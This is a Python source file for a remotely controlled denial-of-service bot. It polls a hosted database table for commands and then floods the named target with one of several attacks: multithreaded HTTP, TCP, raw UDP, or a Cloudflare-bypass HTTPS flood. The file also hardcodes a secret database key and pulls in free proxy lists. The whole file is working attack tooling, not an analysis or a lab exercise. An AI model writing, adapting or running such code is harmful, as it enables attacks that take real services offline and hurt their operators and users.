import socket
import os
import random
from threading import Thread
import multiprocessing
import time
import sys
import json
import ssl
from struct import pack as data_pack


_made__ = "Alexander"

try:
    import requests
except Exception as e:
    os.system("pip3 install requests")
    import requests

try:
    import cloudscraper
except:
    os.system("pip3 install cloudscraper")
    import cloudscraper

try:
    from curl_cffi import requests as curl_requests
except:
    os.system("pip3 install curl_cffi")
    from curl_cffi import requests as curl_requests

try:
    from impacket.ImpactPacket import IP, UDP, Data
except:
    os.system("pip3 install impacket")
    from impacket.ImpactPacket import IP, UDP, Data

SUPABASE_URL = "https://thmtvthwdhnglwejbatg.supabase.co/rest/v1/requests"
SUPABASE_KEY = "sb_secret_2tH8QCobmJfVfv1zn-OoPw_2uwK2cKO"
PROXY_URL = "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc"

HEADERS = {
    "apikey": SUPABASE_KEY,
    "Authorization": f"Bearer {SUPABASE_KEY}",
    "Content-Type": "application/json"
}

USER_AGENTS_URL = "https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt"

def get_my_ip():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except:
        return "127.0.0.1"

MY_IP = get_my_ip()

def MyUser_Agent():
    try:
        response = requests.get(USER_AGENTS_URL, timeout=10)
        if response.status_code == 200:
            user_agents = response.text.strip().split('\n')
            if user_agents:
                return user_agents
    except:
        pass
    return ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"]

def get_proxies():
    try:
        response = requests.get(PROXY_URL, timeout=10)
        if response.status_code == 200:
            data = response.json()
            proxies = []
            for item in data.get('data', []):
                ip = item.get('ip')
                port = item.get('port')
                protocols = item.get('protocols', [])
                if ip and port:
                    for protocol in protocols:
                        if protocol.lower() in ['http', 'https', 'socks4', 'socks5']:
                            proxies.append(f"{protocol.lower()}://{ip}:{port}")
            return proxies
    except:
        return []

def launch_bypass_https(url, duration, threads=700):
    end_time = time.time() + duration
    browsers = ["chrome110", "chrome116", "chrome119", "chrome120", "safari17_0"]
    user_agents = MyUser_Agent()
    
    def attack_thread():
        scraper = cloudscraper.create_scraper()
        while time.time() < end_time:
            try:
                browser = random.choice(browsers)
                headers = {'User-Agent': random.choice(user_agents)}
                curl_requests.get(url, impersonate=browser, headers=headers, timeout=10)
            except:
                try: scraper.get(url, timeout=10)
                except: pass
    
    for _ in range(threads):
        Thread(target=attack_thread, daemon=True).start()
    time.sleep(duration)

def ovh_udp_attack(ip_addr, port, duration, threads=700):
    end_time = time.time() + duration
    methods = ["PGET", "POST", "HEAD", "OPTIONS", "PURGE"]
    paths = ['/0/0/0/0/0/0', '/', '/null', '/%00%00%00%00']

    def attack_thread():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP) as s:
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                while time.time() < end_time:
                    ip_pkt = IP()
                    ip_pkt.set_ip_src(MY_IP)
                    ip_pkt.set_ip_dst(ip_addr)
                    
                    udp_pkt = UDP()
                    udp_pkt.set_uh_sport(random.randint(1024, 65535))
                    udp_pkt.set_uh_dport(port)
                    
                    payload_str = f"{random.choice(methods)} {random.choice(paths)}{os.urandom(1024).decode('latin1', 'ignore')} HTTP/1.1\nHost: {ip_addr}:{port}\r\n\r\n"
                    udp_pkt.contains(Data(payload_str.encode("latin1", "ignore")))
                    ip_pkt.contains(udp_pkt)
                    
                    s.sendto(ip_pkt.get_packet(), (ip_addr, port))
        except:
            pass

    for _ in range(threads):
        Thread(target=attack_thread, daemon=True).start()
    time.sleep(duration)

def tcp_attack(ip, port, duration, threads=700):
    end_time = time.time() + duration
    def attack_thread():
        while time.time() < end_time:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.connect((ip, port))
                    sock.send(os.urandom(1024))
            except:
                pass
    for _ in range(threads):
        Thread(target=attack_thread, daemon=True).start()
    time.sleep(duration)

def moonHttp(host_http, port, duration):
    end_time = time.time() + duration
    user_agents = MyUser_Agent()
    while time.time() < end_time:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as mysocket:
                mysocket.connect((host_http, port))
                mysocket.send(f'GET / HTTP/1.1\r\nHost: {host_http}\r\nUser-Agent: {random.choice(user_agents)}\r\nConnection: keep-alive\r\n\r\n'.encode())
        except:
            pass

def execute_attack(method, ip, port, duration):
    m = method.upper()
    print(f"[*] Started Task: {m} on {ip}:{port}")
    
    if m == "HTTP":
        for _ in range(700): Thread(target=moonHttp, args=(ip, port, duration), daemon=True).start()
        time.sleep(duration)
    elif m == "TCP":
        tcp_attack(ip, port, duration)
    elif m == "BYPASS-HTTPS":
        launch_bypass_https(ip, duration)
    elif m == "OVH-UDP":
        ovh_udp_attack(ip, port, duration)
    
    print(f"[!] Task Finished: {m}")

def check_new_requests():
    print(f"Start Server Loader Wait Requests {_made__}")
    last_id = 0
    while True:
        try:
            r = requests.get(f"{SUPABASE_URL}?select=id,method,ip,port,Time&order=id.desc&limit=1", headers=HEADERS)
            if r.status_code == 200 and r.json():
                req = r.json()[0]
                if req['id'] > last_id:
                    if last_id != 0:
                        multiprocessing.Process(target=execute_attack, args=(req['method'], req['ip'], int(req['port']), int(req.get('Time', 60)))).start()
                    last_id = req['id']
        except: pass
        time.sleep(2)

if __name__ == "__main__":
    check_new_requests()
